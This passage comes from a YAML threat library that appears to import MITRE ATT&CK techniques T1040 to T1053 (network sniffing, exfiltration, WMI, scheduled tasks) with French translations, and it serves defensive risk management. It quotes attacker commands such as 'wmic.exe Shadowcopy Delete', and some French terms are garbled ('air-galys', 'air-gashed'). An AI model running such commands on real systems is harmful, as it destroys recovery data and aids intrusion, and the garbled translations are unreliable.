      VLAN IDs) necessary for subsequent [Lateral Movement](https://attack.mitre.org/tactics/TA0008)
      and/or [Stealth](https://attack.mitre.org/tactics/TA0005) activities. Adversaries
      may likely also utilize network sniffing during [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)
      (AiTM) to passively gain additional knowledge about the environment.


      In cloud-based environments, adversaries may still be able to use traffic mirroring
      services to sniff network traffic from virtual machines. For example, AWS Traffic
      Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified
      instances to collect traffic from and specified targets to send collected traffic
      to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation:
      Azure Virtual Network TAP) Often, much of this traffic will be in cleartext
      due to the use of TLS termination at the load balancer level to reduce the strain
      of encrypting and decrypting traffic.(Citation: Rhino Security Labs AWS VPC
      Traffic Mirroring)(Citation: SpecterOps AWS Traffic Mirroring) The adversary
      can then use exfiltration techniques such as Transfer Data to Cloud Account
      in order to access the sniffed traffic.(Citation: Rhino Security Labs AWS VPC
      Traffic Mirroring)


      On network devices, adversaries may perform network captures using [Network
      Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as
      `monitor capture`.(Citation: US-CERT-TA18-106A)(Citation: capture_embedded_packet_on_software)

      https://attack.mitre.org/techniques/T1040'
    translations:
      fr:
        name: "Reniflement du r\xE9seau"
        description: "Les adversaires peuvent renifler passivement le trafic r\xE9\
          seau afin de recueillir des informations sur un environnement, y compris\
          \ le mat\xE9riel d\u2019authentification transmis sur le r\xE9seau. Le sniffing\
          \ r\xE9seau fait r\xE9f\xE9rence \xE0 l\u2019utilisation de l\u2019interface\
          \ r\xE9seau d\u2019un syst\xE8me pour surveiller ou capturer des informations\
          \ envoy\xE9es via une connexion filaire ou sans fil. Un adversaire peut\
          \ placer une interface r\xE9seau en mode promiscuit\xE9 pour acc\xE9der\
          \ passivement aux donn\xE9es en transit sur le r\xE9seau, ou utiliser des\
          \ ports span pour capturer une plus grande quantit\xE9 de donn\xE9es.\n\n\
          Les donn\xE9es captur\xE9es via cette technique peuvent inclure des identifiants\
          \ utilisateur, en particulier ceux envoy\xE9s via un protocole non s\xE9\
          curis\xE9 et non chiffr\xE9. Des techniques d\u2019empoisonnement par r\xE9\
          solution de services de noms, telles que [Empoisonnement par r\xE9solution\
          \ de noms et relais SMB](https://attack.mitre.org/techniques/T1557/001),\
          \ peuvent \xE9galement \xEAtre utilis\xE9es pour capturer des identifiants\
          \ vers des sites web, des proxies et des syst\xE8mes internes en redirigeant\
          \ le trafic vers un adversaire.\n\nL\u2019analyse r\xE9seau peut r\xE9v\xE9\
          ler des d\xE9tails de configuration, tels que les services en cours, les\
          \ num\xE9ros de version et d\u2019autres caract\xE9ristiques r\xE9seau (par\
          \ exemple adresses IP, noms d\u2019h\xF4te, identifiants VLAN) n\xE9cessaires\
          \ pour les activit\xE9s ult\xE9rieures de [Mouvement Lat\xE9ral](https://attack.mitre.org/tactics/TA0008)\
          \ et/ou [Furtivit\xE9](https://attack.mitre.org/tactics/TA0005). Les adversaires\
          \ peuvent aussi utiliser le sniffing du r\xE9seau pendant [Adversaire-in-the-Middle](https://attack.mitre.org/techniques/T1557)\
          \ (AiTM) pour acqu\xE9rir passivement des connaissances suppl\xE9mentaires\
          \ sur l\u2019environnement.\n\nDans les environnements cloud, les adversaires\
          \ peuvent toujours \xEAtre capables d\u2019utiliser des services de miroir\
          \ de trafic pour d\xE9tecter le trafic r\xE9seau provenant des machines\
          \ virtuelles. Par exemple, AWS Traffic Mirroring, GCP Packet Mirroring et\
          \ Azure vTap permettent aux utilisateurs de d\xE9finir des instances sp\xE9\
          cifi\xE9es pour collecter le trafic et des cibles pr\xE9cises vers lesquelles\
          \ envoyer le trafic collect\xE9. (Citation : Mirroring du trafic AWS)(Citation\
          \ : Mise en miroir de paquets GCP)(Citation : Azure Virtual Network TAP)\
          \ Souvent, une grande partie de ce trafic sera en clair gr\xE2ce \xE0 l\u2019\
          utilisation de la terminaison TLS au niveau de l\u2019\xE9quilibreur de\
          \ charge pour r\xE9duire la pression li\xE9e au chiffrement et au d\xE9\
          chiffrement du trafic. (Citation : Rhino Security Labs Mirroring du trafic\
          \ AWS VPC)(Citation : SpecterOps AWS Traffic Mirroring) L\u2019adversaire\
          \ peut alors utiliser des techniques d\u2019exfiltration telles que Transf\xE9\
          rer des donn\xE9es vers un compte cloud afin d\u2019acc\xE9der au trafic\
          \ d\xE9tect\xE9. (Citation : Rhino Security Labs Mirroring du trafic AWS\
          \ VPC)\n\nSur les appareils r\xE9seau, les adversaires peuvent effectuer\
          \ des captures r\xE9seau en utilisant des commandes [CLI de l\u2019appareil\
          \ r\xE9seau](https://attack.mitre.org/techniques/T1059/008) telles que \xAB\
          \ surveiller la capture \xBB. (Citation : US-CERT-TA18-106A)(Citation :\
          \ capture_embedded_packet_on_software)\nhttps://attack.mitre.org/techniques/T1040"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1041
    ref_id: T1041
    name: Exfiltration Over C2 Channel
    description: 'Adversaries may steal data by exfiltrating it over an existing command
      and control channel. Stolen data is encoded into the normal communications channel
      using the same protocol as command and control communications.

      https://attack.mitre.org/techniques/T1041'
    translations:
      fr:
        name: Exfiltration sur le canal C2
        description: "Les adversaires peuvent voler des donn\xE9es en les exfiltrant\
          \ via un canal de commandement et de contr\xF4le existant. Les donn\xE9\
          es vol\xE9es sont encod\xE9es dans le canal de communication normal en utilisant\
          \ le m\xEAme protocole que les communications de commandement et de contr\xF4\
          le.\nhttps://attack.mitre.org/techniques/T1041"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1046
    ref_id: T1046
    name: Network Service Discovery
    description: "Adversaries may attempt to get a listing of services running on\
      \ remote hosts and local network infrastructure devices, including those that\
      \ may be vulnerable to remote software exploitation. Common methods to acquire\
      \ this information include port, vulnerability, and/or wordlist scans using\
      \ tools that are brought onto a system.(Citation: CISA AR21-126A FIVEHANDS May\
      \ 2021)   \n\nWithin cloud environments, adversaries may attempt to discover\
      \ services running on other cloud hosts. Additionally, if the cloud environment\
      \ is connected to a on-premises environment, adversaries may be able to identify\
      \ services running on non-cloud systems as well.\n\nWithin macOS environments,\
      \ adversaries may use the native Bonjour application to discover services running\
      \ on other macOS hosts within a network. The Bonjour mDNSResponder daemon automatically\
      \ registers and advertises a host\u2019s registered services on the network.\
      \ For example, adversaries can use a mDNS query (such as <code>dns-sd -B _ssh._tcp\
      \ .</code>) to find other systems broadcasting the ssh service.(Citation: apple\
      \ doco bonjour description)(Citation: macOS APT Activity Bradley)\nhttps://attack.mitre.org/techniques/T1046"
    translations:
      fr:
        name: "D\xE9couverte des services r\xE9seau"
        description: "Les adversaires peuvent tenter d\u2019obtenir une liste des\
          \ services fonctionnant sur des h\xF4tes distants et des dispositifs d\u2019\
          infrastructure r\xE9seau locale, y compris ceux susceptibles d\u2019\xEA\
          tre vuln\xE9rables \xE0 l\u2019exploitation logicielle \xE0 distance. Les\
          \ m\xE9thodes courantes pour acqu\xE9rir ces informations incluent les scans\
          \ de port, de vuln\xE9rabilit\xE9 et/ou de listes de mots \xE0 l\u2019aide\
          \ d\u2019outils int\xE9gr\xE9s \xE0 un syst\xE8me. (Citation : CISA AR21-126A\
          \ FIVEHANDS mai 2021)   \n\nDans les environnements cloud, les adversaires\
          \ peuvent tenter de d\xE9couvrir des services fonctionnant sur d\u2019autres\
          \ h\xF4tes cloud. De plus, si l\u2019environnement cloud est connect\xE9\
          \ \xE0 un environnement sur site, les adversaires peuvent \xE9galement identifier\
          \ des services fonctionnant sur des syst\xE8mes non cloud.\n\nDans les environnements\
          \ macOS, les adversaires peuvent utiliser l\u2019application native Bonjour\
          \ pour d\xE9couvrir des services fonctionnant sur d\u2019autres h\xF4tes\
          \ macOS au sein d\u2019un r\xE9seau. Le d\xE9mon mDNSResponder Bonjour enregistre\
          \ automatiquement et annonce les services enregistr\xE9s d\u2019un h\xF4\
          te sur le r\xE9seau. Par exemple, les adversaires peuvent utiliser une requ\xEA\
          te mDNS (comme <code>dns-sd -B _ssh._tcp .)</code> pour trouver d\u2019\
          autres syst\xE8mes diffusant le service ssh. (Citation : description du\
          \ bonjour Apple Doco)(Citation : macOS APT Activity Bradley)\nhttps://attack.mitre.org/techniques/T1046"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1047
    ref_id: T1047
    name: Windows Management Instrumentation
    description: "Adversaries may abuse Windows Management Instrumentation (WMI) to\
      \ execute malicious commands and payloads. WMI is designed for programmers and\
      \ is the infrastructure for management data and operations on Windows systems.(Citation:\
      \ WMI 1-3) WMI is an administration feature that provides a uniform environment\
      \ to access Windows system components.\n\nThe WMI service enables both local\
      \ and remote access, though the latter is facilitated by [Remote Services](https://attack.mitre.org/techniques/T1021)\
      \ such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003)\
      \ and [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006).(Citation:\
      \ WMI 1-3) Remote WMI over DCOM operates using port 135, whereas WMI over WinRM\
      \ operates over port 5985 when using HTTP and 5986 for HTTPS.(Citation: WMI\
      \ 1-3) (Citation: Mandiant WMI)\n\nAn adversary can use WMI to interact with\
      \ local and remote systems and use it as a means to execute various behaviors,\
      \ such as gathering information for [Discovery](https://attack.mitre.org/tactics/TA0007)\
      \ as well as [Execution](https://attack.mitre.org/tactics/TA0002) of commands\
      \ and payloads.(Citation: Mandiant WMI) For example, `wmic.exe` can be abused\
      \ by an adversary to delete shadow copies with the command `wmic.exe Shadowcopy\
      \ Delete` (i.e., [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490)).(Citation:\
      \ WMI 6)\n\n**Note:** `wmic.exe` is deprecated as of January of 2024, with the\
      \ WMIC feature being \u201Cdisabled by default\u201D on Windows 11+. WMIC will\
      \ be removed from subsequent Windows releases and replaced by [PowerShell](https://attack.mitre.org/techniques/T1059/001)\
      \ as the primary WMI interface.(Citation: WMI 7,8) In addition to PowerShell\
      \ and tools like `wbemtool.exe`, COM APIs can also be used to programmatically\
      \ interact with WMI via C++, .NET, VBScript, etc.(Citation: WMI 7,8)\nhttps://attack.mitre.org/techniques/T1047"
    translations:
      fr:
        name: Instrumentation de gestion Windows
        description: "Les adversaires peuvent abuser de Windows Management Instrumentation\
          \ (WMI) pour ex\xE9cuter des commandes et des charges utiles malveillantes.\
          \ WMI est con\xE7ue pour les programmeurs et sert d\u2019infrastructure\
          \ pour la gestion des donn\xE9es et des op\xE9rations sur les syst\xE8mes\
          \ Windows. (Citation : WMI 1-3) WMI est une fonctionnalit\xE9 d\u2019administration\
          \ qui offre un environnement uniforme pour acc\xE9der aux composants syst\xE8\
          me Windows.\n\nLe service WMI permet \xE0 la fois un acc\xE8s local et distant,\
          \ bien que ce dernier soit facilit\xE9 par des [Services \xE0 distance](https://attack.mitre.org/techniques/T1021)\
          \ tels que [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003)\
          \ et [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006).\
          \ (Citation : WMI 1-3) WMI distant sur DCOM fonctionne via le port 135,\
          \ tandis que WMI sur WinRM fonctionne sur le port 5985 lorsqu\u2019on utilise\
          \ HTTP et 5986 pour HTTPS. (Citation : WMI 1-3) (Citation : Mandiant WMI)\n\
          \nUn adversaire peut utiliser WMI pour interagir avec des syst\xE8mes locaux\
          \ et distants et l\u2019utiliser comme moyen d\u2019ex\xE9cuter divers comportements,\
          \ tels que la collecte d\u2019informations pour [D\xE9couverte](https://attack.mitre.org/tactics/TA0007)\
          \ ainsi que [Ex\xE9cution](https://attack.mitre.org/tactics/TA0002) de commandes\
          \ et de charges utiles. (Citation : Mandiant WMI) Par exemple, \xAB wmic.exe\
          \ \xBB peut \xEAtre abus\xE9 par un adversaire pour supprimer des copies\
          \ d\u2019ombre avec la commande \xAB wmic.exe Shadowcopy Delete \xBB (c\u2019\
          est-\xE0-dire [Inhibt System Recovery](https://attack.mitre.org/techniques/T1490)).\
          \ (Citation : WMI 6)\n\n**Note :** 'wmic.exe' est obsol\xE8te depuis janvier\
          \ 2024, la fonctionnalit\xE9 WMIC \xE9tant \xAB d\xE9sactiv\xE9e par d\xE9\
          faut \xBB sur Windows 11+. Le WMIC sera retir\xE9 des versions Windows ult\xE9\
          rieures et remplac\xE9 par [PowerShell](https://attack.mitre.org/techniques/T1059/001)\
          \ comme interface WMI principale. (Citation : WMI 7,8) En plus de PowerShell\
          \ et d\u2019outils comme \xAB wbemtool.exe \xBB, les API COM peuvent \xE9\
          galement \xEAtre utilis\xE9es pour interagir programmatiquement avec WMI\
          \ via C++, .NET, VBScript, etc. (Citation : WMI 7,8)\nhttps://attack.mitre.org/techniques/T1047"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1048
    ref_id: T1048
    name: Exfiltration Over Alternative Protocol
    description: "Adversaries may steal data by exfiltrating it over a different protocol\
      \ than that of the existing command and control channel. The data may also be\
      \ sent to an alternate network location from the main command and control server.\
      \  \n\nAlternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, or any other\
      \ network protocol not being used as the main command and control channel. Adversaries\
      \ may also opt to encrypt and/or obfuscate these alternate channels. \n\n[Exfiltration\
      \ Over Alternative Protocol](https://attack.mitre.org/techniques/T1048) can\
      \ be done using various common operating system utilities such as [Net](https://attack.mitre.org/software/S0039)/SMB\
      \ or FTP.(Citation: Palo Alto OilRig Oct 2016) On macOS and Linux <code>curl</code>\
      \ may be used to invoke protocols such as HTTP/S or FTP/S to exfiltrate data\
      \ from a system.(Citation: 20 macOS Common Tools and Techniques)\n\nMany IaaS\
      \ and SaaS platforms (such as Microsoft Exchange, Microsoft SharePoint, GitHub,\
      \ and AWS S3) support the direct download of files, emails, source code, and\
      \ other sensitive information via the web console or [Cloud API](https://attack.mitre.org/techniques/T1059/009)."
    translations:
      fr:
        name: Exfiltration via protocole alternatif
        description: "Les adversaires peuvent voler des donn\xE9es en les exfiltrant\
          \ via un protocole diff\xE9rent de celui du canal de commande et de contr\xF4\
          le existant. Les donn\xE9es peuvent \xE9galement \xEAtre envoy\xE9es \xE0\
          \ un emplacement r\xE9seau alternatif depuis le serveur principal de commande\
          \ et de contr\xF4le.  \n\nLes protocoles alternatifs incluent FTP, SMTP,\
          \ HTTP/S, DNS, SMB ou tout autre protocole r\xE9seau qui n\u2019est pas\
          \ utilis\xE9 comme canal principal de commande et de contr\xF4le. Les adversaires\
          \ peuvent \xE9galement choisir de chiffrer et/ou d\u2019obscurcir ces canaux\
          \ alternatifs. \n\n[Exfiltration sur protocole alternatif](https://attack.mitre.org/techniques/T1048)\
          \ peut \xEAtre r\xE9alis\xE9e en utilisant divers utilitaires courants du\
          \ syst\xE8me d\u2019exploitation tels que [Net](https://attack.mitre.org/software/S0039)/SMB\
          \ ou FTP. (Citation : Palo Alto OilRig oct. 2016) Sur macOS et Linux, <code>le\
          \ curl</code> peut \xEAtre utilis\xE9 pour invoquer des protocoles tels\
          \ que HTTP/S ou FTP/S afin d\u2019exfiltrer des donn\xE9es d\u2019un syst\xE8\
          me. (Citation : 20 outils et techniques courants sur macOS)\n\nDe nombreuses\
          \ plateformes IaaS et SaaS (telles que Microsoft Exchange, Microsoft SharePoint,\
          \ GitHub et AWS S3) prennent en charge le t\xE9l\xE9chargement direct de\
          \ fichiers, e-mails, code source et autres informations sensibles via la\
          \ console web ou [Cloud API](https://attack.mitre.org/techniques/T1059/009)."
  - urn: urn:intuitem:risk:threat:mitre-attack:t1048.001
    ref_id: T1048.001
    name: Exfiltration Over Symmetric Encrypted Non-C2 Protocol
    description: "Adversaries may steal data by exfiltrating it over a symmetrically\
      \ encrypted network protocol other than that of the existing command and control\
      \ channel. The data may also be sent to an alternate network location from the\
      \ main command and control server. \n\nSymmetric encryption algorithms are those\
      \ that use shared or the same keys/secrets on each end of the channel. This\
      \ requires an exchange or pre-arranged agreement/possession of the value used\
      \ to encrypt and decrypt data. \n\nNetwork protocols that use asymmetric encryption\
      \ often utilize symmetric encryption once keys are exchanged, but adversaries\
      \ may opt to manually share keys and implement symmetric cryptographic algorithms\
      \ (ex: RC4, AES) vice using mechanisms that are baked into a protocol. This\
      \ may result in multiple layers of encryption (in protocols that are natively\
      \ encrypted such as HTTPS) or encryption in protocols that not typically encrypted\
      \ (such as HTTP or FTP).\nhttps://attack.mitre.org/techniques/T1048/001"
    translations:
      fr:
        name: "Exfiltration sur un protocole sym\xE9trique chiffr\xE9 non-C2"
        description: "Les adversaires peuvent voler des donn\xE9es en les exfiltrant\
          \ via un protocole r\xE9seau chiffr\xE9 sym\xE9triquement autre que celui\
          \ du canal de commande et de contr\xF4le existant. Les donn\xE9es peuvent\
          \ \xE9galement \xEAtre envoy\xE9es \xE0 un emplacement r\xE9seau alternatif\
          \ depuis le serveur principal de commande et de contr\xF4le. \n\nLes algorithmes\
          \ de chiffrement sym\xE9trique sont ceux qui utilisent des cl\xE9s/secrets\
          \ partag\xE9s ou identiques \xE0 chaque extr\xE9mit\xE9 du canal. Cela n\xE9\
          cessite un \xE9change ou un accord/possession pr\xE9alablement convenu de\
          \ la valeur utilis\xE9e pour chiffrer et d\xE9chiffrer les donn\xE9es. \n\
          \nLes protocoles r\xE9seau utilisant un chiffrement asym\xE9trique utilisent\
          \ souvent un chiffrement sym\xE9trique une fois les cl\xE9s \xE9chang\xE9\
          es, mais les adversaires peuvent choisir de partager manuellement les cl\xE9\
          s et de mettre en \u0153uvre des algorithmes cryptographiques sym\xE9triques\
          \ (ex. : RC4, AES) plut\xF4t que d\u2019utiliser des m\xE9canismes int\xE9\
          gr\xE9s dans un protocole. Cela peut entra\xEEner plusieurs couches de chiffrement\
          \ (dans des protocoles chiffr\xE9s nativement comme HTTPS) ou un chiffrement\
          \ dans des protocoles qui ne sont g\xE9n\xE9ralement pas chiffr\xE9s (comme\
          \ HTTP ou FTP).\nhttps://attack.mitre.org/techniques/T1048/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1048.002
    ref_id: T1048.002
    name: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol
    description: "Adversaries may steal data by exfiltrating it over an asymmetrically\
      \ encrypted network protocol other than that of the existing command and control\
      \ channel. The data may also be sent to an alternate network location from the\
      \ main command and control server. \n\nAsymmetric encryption algorithms are\
      \ those that use different keys on each end of the channel. Also known as public-key\
      \ cryptography, this requires pairs of cryptographic keys that can encrypt/decrypt\
      \ data from the corresponding key. Each end of the communication channels requires\
      \ a private key (only in the procession of that entity) and the public key of\
      \ the other entity. The public keys of each entity are exchanged before encrypted\
      \ communications begin. \n\nNetwork protocols that use asymmetric encryption\
      \ (such as HTTPS/TLS/SSL) often utilize symmetric encryption once keys are exchanged.\
      \ Adversaries may opt to use these encrypted mechanisms that are baked into\
      \ a protocol.\nhttps://attack.mitre.org/techniques/T1048/002"
    translations:
      fr:
        name: "Exfiltration via un protocole asym\xE9trique chiffr\xE9 non-C2"
        description: "Les adversaires peuvent voler des donn\xE9es en les exfiltrant\
          \ via un protocole r\xE9seau chiffr\xE9 de fa\xE7on asym\xE9trique autre\
          \ que celui du canal de commande et de contr\xF4le existant. Les donn\xE9\
          es peuvent \xE9galement \xEAtre envoy\xE9es \xE0 un emplacement r\xE9seau\
          \ alternatif depuis le serveur principal de commande et de contr\xF4le.\
          \ \n\nLes algorithmes de chiffrement asym\xE9trique sont ceux qui utilisent\
          \ diff\xE9rentes cl\xE9s \xE0 chaque extr\xE9mit\xE9 du canal. \xC9galement\
          \ appel\xE9e cryptographie \xE0 cl\xE9 publique, elle n\xE9cessite des paires\
          \ de cl\xE9s cryptographiques capables de chiffrer/d\xE9chiffrer les donn\xE9\
          es de la cl\xE9 correspondante. Chaque extr\xE9mit\xE9 des canaux de communication\
          \ n\xE9cessite une cl\xE9 priv\xE9e (uniquement dans la procession de cette\
          \ entit\xE9) et la cl\xE9 publique de l\u2019autre entit\xE9. Les cl\xE9\
          s publiques de chaque entit\xE9 sont \xE9chang\xE9es avant le d\xE9but des\
          \ communications chiffr\xE9es. \n\nLes protocoles r\xE9seau utilisant un\
          \ chiffrement asym\xE9trique (comme HTTPS/TLS/SSL) utilisent souvent un\
          \ chiffrement sym\xE9trique une fois les cl\xE9s \xE9chang\xE9es. Les adversaires\
          \ peuvent choisir d\u2019utiliser ces m\xE9canismes chiffr\xE9s int\xE9\
          gr\xE9s dans un protocole.\nhttps://attack.mitre.org/techniques/T1048/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1048.003
    ref_id: T1048.003
    name: Exfiltration Over Unencrypted Non-C2 Protocol
    description: 'Adversaries may steal data by exfiltrating it over an un-encrypted
      network protocol other than that of the existing command and control channel.
      The data may also be sent to an alternate network location from the main command
      and control server.(Citation: copy_cmd_cisco)


      Adversaries may opt to obfuscate this data, without the use of encryption, within
      network protocols that are natively unencrypted (such as HTTP, FTP, or DNS).
      This may include custom or publicly available encoding/compression algorithms
      (such as base64) as well as embedding data within protocol headers and fields.

      https://attack.mitre.org/techniques/T1048/003'
    translations:
      fr:
        name: "Exfiltration via un protocole non chiffr\xE9 non C2"
        description: "Les adversaires peuvent voler des donn\xE9es en les exfiltrant\
          \ via un protocole r\xE9seau non chiffr\xE9 autre que celui du canal de\
          \ commande et de contr\xF4le existant. Les donn\xE9es peuvent \xE9galement\
          \ \xEAtre envoy\xE9es \xE0 un emplacement r\xE9seau alternatif depuis le\
          \ serveur principal de commande et de contr\xF4le. (Citation : copy_cmd_cisco)\n\
          \nLes adversaires peuvent choisir d\u2019obscurcir ces donn\xE9es, sans\
          \ recourir au chiffrement, au sein de protocoles r\xE9seau non chiffr\xE9\
          s nativement (tels que HTTP, FTP ou DNS). Cela peut inclure des algorithmes\
          \ d\u2019encodage/compression personnalis\xE9s ou accessibles publiquement\
          \ (tels que base64) ainsi que l\u2019int\xE9gration de donn\xE9es dans les\
          \ en-t\xEAtes et champs du protocole.\nhttps://attack.mitre.org/techniques/T1048/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1049
    ref_id: T1049
    name: System Network Connections Discovery
    description: "Adversaries may attempt to get a listing of network connections\
      \ to or from the compromised system they are currently accessing or from remote\
      \ systems by querying for information over the network. \n\nAn adversary who\
      \ gains access to a system that is part of a cloud-based environment may map\
      \ out Virtual Private Clouds or Virtual Networks in order to determine what\
      \ systems and services are connected. The actions performed are likely the same\
      \ types of discovery techniques depending on the operating system, but the resulting\
      \ information may include details about the networked cloud environment relevant\
      \ to the adversary's goals. Cloud providers may have different ways in which\
      \ their virtual networks operate.(Citation: Amazon AWS VPC Guide)(Citation:\
      \ Microsoft Azure Virtual Network Overview)(Citation: Google VPC Overview) Similarly,\
      \ adversaries who gain access to network devices may also perform similar discovery\
      \ activities to gather information about connected systems and services.\n\n\
      Utilities and commands that acquire this information include [netstat](https://attack.mitre.org/software/S0104),\
      \ \"net use,\" and \"net session\" with [Net](https://attack.mitre.org/software/S0039).\
      \ In Mac and Linux, [netstat](https://attack.mitre.org/software/S0104) and <code>lsof</code>\
      \ can be used to list current connections. <code>who -a</code> and <code>w</code>\
      \ can be used to show which users are currently logged in, similar to \"net\
      \ session\". Additionally, built-in features native to network devices and [Network\
      \ Device CLI](https://attack.mitre.org/techniques/T1059/008) may be used (e.g.\
      \ <code>show ip sockets</code>, <code>show tcp brief</code>).(Citation: US-CERT-TA18-106A)\
      \ On ESXi servers, the command `esxi network ip connection list` can be used\
      \ to list active network connections.(Citation: Sygnia ESXi Ransomware 2025)\n\
      https://attack.mitre.org/techniques/T1049"
    translations:
      fr:
        name: "D\xE9couverte des connexions r\xE9seau syst\xE8me"
        description: "Les adversaires peuvent tenter d\u2019obtenir une liste des\
          \ connexions r\xE9seau vers ou depuis le syst\xE8me compromis auquel ils\
          \ acc\xE8dent actuellement, ou depuis des syst\xE8mes distants en interrogeant\
          \ des informations via le r\xE9seau. \n\nUn adversaire qui acc\xE8de \xE0\
          \ un syst\xE8me faisant partie d\u2019un environnement cloud peut cartographier\
          \ des Clouds priv\xE9s Virtuels ou des R\xE9seaux Virtuels afin de d\xE9\
          terminer quels syst\xE8mes et services sont connect\xE9s. Les actions effectu\xE9\
          es sont probablement les m\xEAmes types de techniques de d\xE9couverte selon\
          \ le syst\xE8me d\u2019exploitation, mais les informations r\xE9sultantes\
          \ peuvent inclure des d\xE9tails sur l\u2019environnement cloud en r\xE9\
          seau pertinents pour les objectifs de l\u2019adversaire. Les fournisseurs\
          \ cloud peuvent avoir diff\xE9rentes fa\xE7ons de fonctionner leurs r\xE9\
          seaux virtuels. (Citation : Guide Amazon AWS VPC)(Citation : Aper\xE7u du\
          \ r\xE9seau virtuel Microsoft Azure)(Citation : Aper\xE7u Google VPC) De\
          \ m\xEAme, les adversaires qui acc\xE8dent aux dispositifs r\xE9seau peuvent\
          \ \xE9galement effectuer des activit\xE9s de d\xE9couverte similaires pour\
          \ recueillir des informations sur les syst\xE8mes et services connect\xE9\
          s.\n\nLes utilitaires et commandes qui acqui\xE8rent ces informations incluent\
          \ [netstat](https://attack.mitre.org/software/S0104), \xAB utilisation nette\
          \ \xBB et \xAB session r\xE9seau \xBB avec [Net](https://attack.mitre.org/software/S0039).\
          \ Sur Mac et Linux, [netstat](https://attack.mitre.org/software/S0104) et\
          \ <code>lsof</code> peuvent \xEAtre utilis\xE9s pour lister les connexions\
          \ actuelles. <code>Qui -a</code> et <code>w</code> peuvent \xEAtre utilis\xE9\
          s pour indiquer quels utilisateurs sont actuellement connect\xE9s, de mani\xE8\
          re similaire \xE0 \xAB Net Session \xBB. De plus, des fonctionnalit\xE9\
          s int\xE9gr\xE9es aux dispositifs r\xE9seau et \xE0 la [CLI des dispositifs\
          \ r\xE9seau](https://attack.mitre.org/techniques/T1059/008) peuvent \xEA\
          tre utilis\xE9es (par exemple, <code>afficher les sockets IP</code>, <code>afficher\
          \ le brief TCP</code>). (Citation : US-CERT-TA18-106A) Sur les serveurs\
          \ ESXi, la commande \xAB esxi network ip connection list \xBB peut \xEA\
          tre utilis\xE9e pour lister les connexions r\xE9seau actives. (Citation\
          \ : Sygnia ESXi Ransomware 2025)\nhttps://attack.mitre.org/techniques/T1049"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1052
    ref_id: T1052
    name: Exfiltration Over Physical Medium
    description: 'Adversaries may attempt to exfiltrate data via a physical medium,
      such as a removable drive. In certain circumstances, such as an air-gapped network
      compromise, exfiltration could occur via a physical medium or device introduced
      by a user. Such media could be an external hard drive, USB drive, cellular phone,
      MP3 player, or other removable storage and processing device. The physical medium
      or device could be used as the final exfiltration point or to hop between otherwise
      disconnected systems.

      https://attack.mitre.org/techniques/T1052'
    translations:
      fr:
        name: Exfiltration sur un milieu physique
        description: "Les adversaires peuvent tenter d\u2019exfiltrer des donn\xE9\
          es via un support physique, comme un disque amovible. Dans certaines circonstances,\
          \ comme une compromission r\xE9seau air-galys, une exfiltration peut se\
          \ produire via un support ou un dispositif physique introduit par un utilisateur.\
          \ Ces m\xE9dias peuvent \xEAtre un disque dur externe, une cl\xE9 USB, un\
          \ t\xE9l\xE9phone portable, un lecteur MP3 ou tout autre dispositif de stockage\
          \ et de traitement amovible. Le support physique ou l\u2019appareil pouvait\
          \ servir de point d\u2019exfiltration final ou pour sauter entre des syst\xE8\
          mes autrement d\xE9connect\xE9s.\nhttps://attack.mitre.org/techniques/T1052"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1052.001
    ref_id: T1052.001
    name: Exfiltration over USB
    description: 'Adversaries may attempt to exfiltrate data over a USB connected
      physical device. In certain circumstances, such as an air-gapped network compromise,
      exfiltration could occur via a USB device introduced by a user. The USB device
      could be used as the final exfiltration point or to hop between otherwise disconnected
      systems.

      https://attack.mitre.org/techniques/T1052/001'
    translations:
      fr:
        name: Exfiltration via USB
        description: "Les adversaires peuvent tenter d\u2019exfiltrer des donn\xE9\
          es via un appareil physique connect\xE9 \xE0 une cl\xE9 USB. Dans certaines\
          \ circonstances, comme une compromission r\xE9seau air-gashed, une exfiltration\
          \ pouvait se produire via un p\xE9riph\xE9rique USB introduit par un utilisateur.\
          \ Le p\xE9riph\xE9rique USB pouvait servir de point d\u2019exfiltration\
          \ final ou pour sauter entre des syst\xE8mes autrement d\xE9connect\xE9\
          s.\nhttps://attack.mitre.org/techniques/T1052/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1053
    ref_id: T1053
    name: Scheduled Task/Job
    description: 'Adversaries may abuse task scheduling functionality to facilitate
      initial or recurring execution of malicious code. Utilities exist within all
      major operating systems to schedule programs or scripts to be executed at a
      specified date and time. A task can also be scheduled on a remote system, provided
      the proper authentication is met (ex: RPC and file and printer sharing in Windows
      environments). Scheduling a task on a remote system typically may require being
      a member of an admin or otherwise privileged group on the remote system.(Citation:
      TechNet Task Scheduler Security)


      Adversaries may use task scheduling to execute programs at system startup or
      on a scheduled basis for persistence. These mechanisms can also be abused to
      run a process under the context of a specified account (such as one with elevated
      permissions/privileges). Similar to [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218),
      adversaries have also abused task scheduling to potentially mask one-time execution
      under a trusted system process.(Citation: ProofPoint Serpent)

      https://attack.mitre.org/techniques/T1053'
    translations:
      fr:
        name: "T\xE2che/T\xE2che planifi\xE9e"
        description: "Les adversaires peuvent abuser des fonctionnalit\xE9s de planification\
          \ des t\xE2ches pour faciliter l\u2019ex\xE9cution initiale ou r\xE9currente\
          \ de code malveillant. Des utilitaires existent dans tous les principaux\
          \ syst\xE8mes d\u2019exploitation pour programmer l\u2019ex\xE9cution de\
          \ programmes ou scripts \xE0 une date et une heure sp\xE9cifi\xE9es. Une\
          \ t\xE2che peut \xE9galement \xEAtre planifi\xE9e sur un syst\xE8me distant,\
          \ \xE0 condition que l\u2019authentification appropri\xE9e soit respect\xE9\
